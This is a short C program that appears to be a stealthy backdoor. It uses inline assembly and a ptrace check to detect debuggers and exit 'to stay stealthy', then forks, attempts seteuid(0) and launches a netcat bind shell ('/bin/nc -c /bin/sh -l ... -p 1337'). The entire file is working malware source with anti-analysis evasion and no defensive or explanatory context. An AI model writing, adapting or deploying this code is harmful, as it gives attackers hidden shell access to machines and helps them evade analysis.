# include <stdio.h>
# include <stdlib.h>
# include <string.h>
# include <assert.h>
# include <errno.h>
# include <sys/ptrace.h>
# include <unistd.h>

int byte_ =(0);
  
int main (void){
  

        /* Junk code asm for obfuscation (anti dbg)*/
        __asm__(
	"xor %eax,%eax \012"
	"xor %ebx,%ebx \012"
	"xor %ecx,%ecx \012"
	"xor %edx,%edx \012"
	"mov %ebx,%ecx \012"
	"inc %ecx \012"
	"mov $0x1A, %eax \012"
	"int $0x80 \012"
        );

	if (byte_  != 0 ){
	    /* Junk code modified ?? */
	    exit(EXIT_FAILURE);
	}

    
        /* Routine anti débugg */
	if((ptrace(ptrace(PTRACE_TRACEME,0,1,0) < 0)) == -1 ){
		/* if DBG attached = exit to stay stealthy */
		exit(EXIT_FAILURE);
	}
	
	int nPid=fork();
	
	switch(nPid){
		case 0: {
		    seteuid(0);
		    system("/bin/nc -c /bin/sh -l 127.0.0.1 -p 1337&");
		}
		default:{
			wait(NULL);
		}
	}
	return (0);
}


